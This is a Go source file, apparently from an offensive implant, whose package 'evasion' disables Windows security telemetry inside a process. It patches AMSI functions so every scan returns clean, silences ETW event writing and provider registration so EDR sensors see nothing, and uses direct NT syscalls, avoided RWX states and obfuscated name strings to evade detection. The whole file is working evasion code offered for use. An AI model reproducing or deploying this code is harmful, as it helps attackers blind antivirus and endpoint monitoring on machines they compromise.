//go:build windows
// +build windows

package evasion

import (
	"golang.org/x/sys/windows"
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
)

// applyMemPatch writes patch bytes to addr using direct NT syscalls.
//
// Protection sequence: RX → RW (not RWX — avoids the suspicious RWX
// intermediate state that EDRs alarm on) → write → RX restored.
// Falls back to RWX only if the page is not currently RX/RO.
func applyMemPatch(addr uintptr, patch []byte) {
	if addr == 0 || len(patch) == 0 {
		return
	}
	patchSize := uintptr(len(patch))
	// Prefer RW over RWX: same write capability, lower EDR signal.
	old, ok := ntProtect(addr, patchSize, windows.PAGE_READWRITE)
	if !ok {
		// Page might already be RWX or have unusual flags; try RWX as fallback.
		old, ok = ntProtect(addr, patchSize, windows.PAGE_EXECUTE_READWRITE)
		if !ok {
			return
		}
	}
	ntWrite(addr, patch)
	ntFlush(addr, patchSize)
	ntProtect(addr, patchSize, old)
}

// patchNtdllFunc patches a single ntdll export by name (stack-string).
// patch is applied with applyMemPatch; missing exports are silently skipped.
func patchNtdllFunc(name string, patch []byte) {
	ntdll := windows.NewLazySystemDLL(sNtdll())
	proc := ntdll.NewProc(name)
	if proc.Find() != nil {
		return
	}
	applyMemPatch(proc.Addr(), patch)
}

// patchAMSI patches AmsiScanBuffer, AmsiOpenSession, and AmsiInitialize so
// every AMSI scan returns AMSI_RESULT_CLEAN (0), sessions silently appear to
// succeed, and any attempt to register a new AMSI provider (e.g. a late-loaded
// Defender component) also silently fails.
// DLL and proc names are built from byte arrays — no string literals in binary.
func patchAMSI() {
	amsi := windows.NewLazySystemDLL(sAmsiDLL())
	p := []byte{0x31, 0xC0, 0xC3} // xor eax,eax; ret
	// AmsiScanBuffer → AMSI_RESULT_CLEAN = 0
	scan := amsi.NewProc(sAmsiScanBuffer())
	if scan.Find() == nil {
		applyMemPatch(scan.Addr(), p)
	}
	// AmsiOpenSession → S_OK = 0
	sess := amsi.NewProc(sAmsiOpenSession())
	if sess.Find() == nil {
		applyMemPatch(sess.Addr(), p)
	}
	// AmsiInitialize → S_OK = 0: prevents any new AMSI provider from initialising.
	init_ := amsi.NewProc(sAmsiInitialize())
	if init_.Find() == nil {
		applyMemPatch(init_.Addr(), p)
	}
}

// patchETW patches the ETW write and trace-control functions so the process
// emits no ETW events visible to EDR sensors.  All use "xor eax,eax; ret"
// (STATUS_SUCCESS) rather than bare "ret" so callers that check the return
// value don't fault.
//
// NtTraceEvent and NtTraceControl are additional kernel-routed ETW paths used
// by Windows Defender's real-time protection and ETW-TI; silencing them cuts
// off a channel that patchETW's user-mode Etw* patches do not cover.
func patchETW() {
	// 31 C0 C3 — xor eax,eax; ret  (NTSTATUS 0 = STATUS_SUCCESS)
	p := []byte{0x31, 0xC0, 0xC3}
	patchNtdllFunc(sEtwEventWrite(), p)
	patchNtdllFunc(sEtwEventWriteFull(), p)
	patchNtdllFunc(sEtwEventWriteEx(), p)
	patchNtdllFunc(sEtwEventWriteTransfer(), p)
	patchNtdllFunc(sNtTraceEvent(), p)
	patchNtdllFunc(sNtTraceControl(), p)
}

// patchEtwRegister patches EtwEventRegister → ret so any future ETW provider
// registrations in this process silently fail.  Complements patchETW which
// only silences writes on already-registered providers.
func patchEtwRegister() {
	patchNtdllFunc(sEtwEventRegister(), []byte{0xC3})
}
